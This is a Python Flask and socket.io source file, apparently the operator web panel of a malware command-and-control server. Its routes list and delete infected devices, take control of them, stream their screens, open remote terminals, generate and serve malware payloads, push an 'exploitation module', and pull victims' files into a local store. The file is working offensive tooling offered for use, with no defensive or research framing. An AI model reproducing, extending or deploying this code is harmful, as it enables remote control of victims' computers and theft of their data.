from flask import Flask, render_template, request, redirect, send_from_directory
import eventlet
import socketio
from c2 import C2
import os
import json
import threading


app = Flask(__name__)
sio = socketio.Server(cors_allowed_origins='*', logger=False, max_http_buffer_size=1e8 )
malware = C2(sio)

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/files")
def upload():
    return render_template("upload.html")

@app.route("/payload")
def payload():
    return render_template("payload.html")

@app.route("/screen/<path:path>")
def screen(path):
    devices = malware.list_devices()
    if path in devices:
        return render_template("screen.html")
    else:
        return redirect('/')

@app.route('/terminal/<path:path>')
def terminal(path):
    devices = malware.list_devices()
    if path in devices:
        return render_template("terminal.html")
    else:
        return redirect('/')

@app.route('/term/<path:path>')
def term(path):
    return render_template("jterm.html")


@app.route('/client/<path:filename>')
def client(filename):
    return send_from_directory('templates/client', filename)

@app.route('/get_payloads/<path:filename>')
def get_payloads(filename):
    return send_from_directory('payloads', filename, as_attachment=True)




@app.route('/devices', methods=['POST'])
def post():
    return malware.list_all_devices()

@app.route('/delete', methods=['POST'])
def delete():
    data = request.get_json()
    malware.delete_device(data['device_id'])
    return ""

@app.route('/ctrl', methods=['POST'])
def ctrl():
    data = request.get_json()
    malware.ctrl(data['device_id'])
    return ""

@app.route('/payload', methods=['POST'])
def payload1():
    data = request.get_json()
    malware.payload(data)
    return ""

@app.route('/download', methods=['POST'])
def download1():
    data = request.get_json()
    threading.Thread(target=malware.generate, args=(data,)).start()
    return ""

@app.route('/list_payloads', methods=['POST'])
def list_payloads():
    try:
        return str(os.listdir('payloads'))
    except:
        return "[]"

@app.route('/explotation_module', methods=['POST'])
def send_explotation_module():
    data = request.get_json()
    malware.explotation_module(data)
    return ""


@app.route('/upload_file', methods=['POST'])
def upload_file():
    data = request
    malware.upload_file(data)
    return ""



@app.route('/download_file', methods=['POST'])
def download_file():
    data = request.get_json()
    malware.download_file(data)
    return ""


@app.route('/get_downloaded_files/<path:filename>')
def get_downloaded_files(filename):
    return send_from_directory('files_saved', filename, as_attachment=True)


@app.route('/list_files', methods=['POST'])
def list_files():
    try:
        return str(os.listdir('files_saved'))
    except:
        return "[]"



if __name__ == "__main__":
    flaskApp = socketio.Middleware(sio, app)
    eventlet.wsgi.server(eventlet.listen(('0.0.0.0', 5000)), flaskApp)